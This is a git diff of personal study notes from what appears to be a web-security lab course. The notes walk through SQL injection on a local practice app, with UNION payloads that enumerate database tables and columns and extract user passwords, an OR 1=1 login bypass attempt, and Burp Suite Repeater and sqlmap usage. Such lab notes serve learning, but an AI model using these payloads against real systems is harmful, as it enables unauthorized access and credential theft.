@@ -1728,7 +1728,7 @@ fi
 `sudo docker ps -a`                                  -->  <span style="color:#00b050">check</span> which containers are <span style="color:#00b050">running</span>
 `sudo docker rm <container-ID>`            -->  <span style="color:#00b050">remove</span> the container
                                        <span style="background:#fff88f">to remove all containers:</span>
-                                       `sudo docker rm $(sudo docker ps -aq)`
+`sudo docker rm $(sudo docker ps -aq)`
 
 ### BurpSuite
 once everything is working:
@@ -1749,6 +1749,7 @@ we'll find a simply search bar:
 if we write for example -->  jeremy => it will return the email
 ![[Pasted image 20240307111601.png]]
 [[cheet#SQL Injection]]
+[SQL Injection Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 ##### Basic trigger and operators
 - try to use characters that might trigger an error:
   `jeremy'`
@@ -1777,3 +1778,88 @@ we find something
 =>
 `jeremy' union select null,null,version()#` -->  to read the db version
 ![[Pasted image 20240307113541.png]]
+<span style="background:#fff88f">to find all the tables that exist in the db:</span>
+`jeremy' union select null,null,table_name from information_schema.tables#`
+
+<span style="background:#fff88f">get all the columns name that exist in the db:</span>
+`jeremy' union select null,null,column_name from information_schema.columns#`
+
+=>
+our tables for this challenge is -->  <span style="color:#00b050">injection0x01</span>    (we can find it using the command above)
+=>
+we want to get <span style="color:#00b050">jeremy password</span>:
+`jeremy' union select null,null,password from injection0x01#`
+![[Pasted image 20240307114407.png]]
+in this case we have found -->  <span style="color:#00b050">all the passwords in the table</span> 
+
+>[!warning] Constraint
+>sometimes if you use something like this:
+>`jeremy' union select null,null,...`
+>
+>and the values in the null columns are not a string => you will get an error
+>=>
+>try to use different things:
+>for example:
+>- null(int)
+>- 1
+
+
+
+
+
+#### Injection 0x02
+![[Pasted image 20240307115338.png]]
+default credentials -->  `jeremy:jeremy`
+
+##### BurpSuite
+- open it
+- click on Target > Scope Settings > Add > `http://localhost` > Ok > Yes
+  ![[Pasted image 20240307120204.png]]
+###### Enable history only from the target site
+  go to Proxy > HTTP history > right click on one of them > Clear History
+  =>
+  in this way if you search for something in google =>  it won't appear in the history
+
+
+- insert the default credentials in the webpage
+- <span style="background:#fff88f">first thing to do always:</span>
+  open burpsuite and go to the History > double click on the POST request to see it
+- you can also see the Response =>  always look at the `Content-length` in the response
+                                 (in this case is 1928)
+
+###### Use Repeater
+repeater allows you to -->  inject data and modify them
+=>
+- right click on the POST request that you opened
+- send to Repeater
+- open the Repeater section
+- try to modify the password to something else > click on Send > look at the response
+- now the `Content-Length` is different (2122)
+  >[!info] Look visually
+  >if you want to look the response visually:
+  >=>
+  >after the Response click on -->  Render
+  >![[Pasted image 20240307123321.png]]
+  
+- let's try to inject `jeremy' or 1=1#`
+  =>
+	- add to the username `' or 1=1#`
+	- select this text > CTRL+U  -->  to include it as input > then click on Send
+	- =>
+	  we still receive a response with 2122 => invalid credentials
+- try also with `jeremy" or 1=1#` -->  same result :(
+
+=>
+let's try to automate this process to find if there is potential SQL injection vuln:
+###### Sqlmap
+- copy the entire POST request with the initial values   (=> remove the 'or 1=1#)
+- save it inside a text file
+- sqlmap -r req.txt
+=>
+in this case -->  the tool said that the parameters does not seem to be injectable 
+![[Pasted image 20240307130311.png]]
+
+What can we do now:
+- go back to manual testing
+- download a list of payloads and try to fuzz it
+- look for other injection points
